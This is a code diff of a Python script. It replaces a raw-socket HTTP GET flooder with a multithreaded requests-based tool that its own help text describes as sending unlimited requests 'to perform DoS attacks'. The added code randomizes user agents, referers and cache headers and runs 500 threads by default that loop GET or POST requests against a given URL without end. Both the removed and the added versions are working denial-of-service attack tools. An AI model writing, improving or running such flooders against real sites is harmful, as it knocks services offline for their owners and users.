@@ -1,94 +1,143 @@
-# -*- coding: utf-8 -*-
-import random
-import socket
-import string
+import requests
 import sys
 import threading
-import time
+import random
+import re
+import argparse
 
-# Parse inputs
-host = ""
-ip = ""
-port = 0
-num_requests = 0
+host=''
+headers_useragents=[]
+request_counter=0
+printedMsgs = []
 
-if len(sys.argv) == 2:
-    port = 80
-    num_requests = 100000000
-elif len(sys.argv) == 3:
-    port = int(sys.argv[2])
-    num_requests = 100000000
-elif len(sys.argv) == 4:
-    port = int(sys.argv[2])
-    num_requests = int(sys.argv[3])
-else:
-    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
-    sys.exit(1)
+def printMsg(msg):
+	if msg not in printedMsgs:
+		print ("\n"+msg + " after %i requests" % request_counter)
+		printedMsgs.append(msg)
 
-# Convert FQDN to IP
-try:
-    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    print " ERROR\n Make sure you entered a correct website"
-    sys.exit(2)
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+	
+def randomString(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
 
-# Create a shared variable for thread counts
-thread_num = 0
-thread_num_mutex = threading.Lock()
+def initHeaders():
+	useragent_list()
+	global headers_useragents, additionalHeaders
+	headers = {
+				'User-Agent': random.choice(headers_useragents),
+				'Cache-Control': 'no-cache',
+				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
+				'Keep-Alive': str(random.randint(110,120)),
+				'Connection': 'keep-alive'
+				}
+
+	if additionalHeaders:
+		for header in additionalHeaders:
+			headers.update({header.split(":")[0]:header.split(":")[1]})
+	return headers
+
+def handleStatusCodes(status_code):
+	global request_counter
+	sys.stdout.write("\r%i requests has been sent" % request_counter)
+	sys.stdout.flush()
+	if status_code == 429:
+			printMsg("You have been throttled")
+	if status_code == 500:
+		printedMsg("Status code 500 received")
+
+def sendGET(url):
+	global request_counter
+	headers = initHeaders()
+	try:
+		request_counter+=1
+		request = requests.get(url, headers=headers)
+		# print 'her'
+		handleStatusCodes(request.status_code)
+	except:
+		pass
+
+def sendPOST(url, payload):
+	global request_counter
+	headers = initHeaders()
+	try:
+		request_counter+=1
+		if payload:
+			request = requests.post(url, data=payload, headers=headers)
+		else:
+			request = requests.post(url, headers=headers)
+		handleStatusCodes(request.status_code)
+	except:
+		pass
+
+class SendGETThread(threading.Thread):
+	def run(self):
+		try:
+			while True:
+				global url
+				sendGET(url)
+		except:
+			pass
+
+class SendPOSTThread(threading.Thread):
+	def run(self):
+		try:
+			while True:
+				global url, payload
+				sendPOST(url, payload)
+		except:
+			pass
 
 
-# Print thread status
-def print_status():
-    global thread_num
-    thread_num_mutex.acquire(True)
+# TODO:
+# check if the site stop responding and alert
 
-    thread_num += 1
-    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#"
+def main(argv):
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
+	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
+	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
+	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
+	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
+	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
+	args = parser.parse_args()
 
-    thread_num_mutex.release()
+	global url, payload, additionalHeaders
+	additionalHeaders = args.ah
+	payload = args.d
 
+	if args.g:
+		url = args.g
+		for i in range(args.t):
+			t = SendGETThread()
+			t.start()
 
-# Generate URL Path
-def generate_url_path():
-    msg = str(string.letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, 5))
-    return data
-
-
-# Perform the request
-def attack():
-    print_status()
-    url_path = generate_url_path()
-
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        # Open the connection on that raw socket
-        dos.connect((ip, port))
-
-        # Send the request according to HTTP spec
-        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-    except socket.error, e:
-        print "\n [ No connection, server may be down ]: " + str(e)
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
-
-
-print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
-
-# Spawn a thread per request
-all_threads = []
-for i in xrange(num_requests):
-    t1 = threading.Thread(target=attack)
-    t1.start()
-    all_threads.append(t1)
-
-    # Adjusting this sleep time will affect requests per second
-    time.sleep(0.01)
-
-for current_thread in all_threads:
-    current_thread.join()  # Make the main thread wait for the children threads
+	if args.p:
+		url = args.p
+		for i in range(args.t):
+			t = SendPOSTThread()
+			t.start()
+	
+	if len(sys.argv)==1:
+		parser.print_help()
+		exit()
+	
+if __name__ == "__main__":
+   main(sys.argv[1:])
